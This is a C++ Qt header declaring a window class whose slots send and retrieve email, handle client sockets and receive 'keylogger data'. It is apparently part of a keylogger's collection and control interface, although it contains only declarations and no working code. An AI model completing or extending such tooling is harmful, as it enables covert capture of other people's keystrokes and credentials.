#pragma once

#include <QMainWindow>
#include "ui_thirdwindow.h"
#include "client.h"

QT_BEGIN_NAMESPACE
namespace Ui {
	class ThirdWindow;
}
QT_END_NAMESPACE

class ThirdWindow : public QMainWindow
{
	Q_OBJECT

public:
	ThirdWindow(QWidget* parent = nullptr);
	~ThirdWindow();

private slots:
	void retrieveMail();
	void sendEmail(QString subject, QString body);
	void sendEmail_Attachment(QString subject, QString body, QString attachment);
	void handleClient(SOCKET clientSocket);
	void receiveKeyloggerData(SOCKET clientSocket);



private:
	Ui::ThirdWindow* ui;
};